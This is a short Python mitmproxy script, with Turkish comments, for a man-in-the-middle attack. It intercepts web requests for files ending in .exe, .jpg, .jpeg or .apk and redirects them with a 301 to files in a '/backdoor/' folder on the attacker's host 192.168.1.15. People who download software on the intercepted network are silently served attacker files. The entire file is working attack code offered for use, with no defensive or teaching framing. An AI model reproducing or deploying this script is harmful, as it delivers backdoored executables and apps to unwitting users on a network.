import mitmproxy

def request(flow):
	if flow.request.host != "192.168.1.15" and flow.request.pretty_url.endswith(".exe"):
		flow.response = mitmproxy.http.HTTPResponse.make(301, "", {"Location" : "http://192.168.1.15/backdoor/installation.exe"})
	elif flow.request.host != "192.168.1.15" and flow.request.pretty_url.endswith(".jpg"):
		flow.response = mitmproxy.http.HTTPResponse.make(301, "", {"Location" : "http://192.168.1.15/backdoor/images.jpg"})
	elif flow.request.host != "192.168.1.15" and flow.request.pretty_url.endswith(".jpeg"):
		flow.response = mitmproxy.http.HTTPResponse.make(301, "", {"Location" : "http://192.168.1.15/backdoor/images.jpeg"})
	elif flow.request.host != "192.168.1.15" and flow.request.pretty_url.endswith(".apk"):
		flow.response = mitmproxy.http.HTTPResponse.make(301, "", {"Location" : "http://192.168.1.15/backdoor/install.apk"})
		
		
		
		#1-HTTP STATUS 301
		#2-İçerik
		#3-Dosyanın Konumu
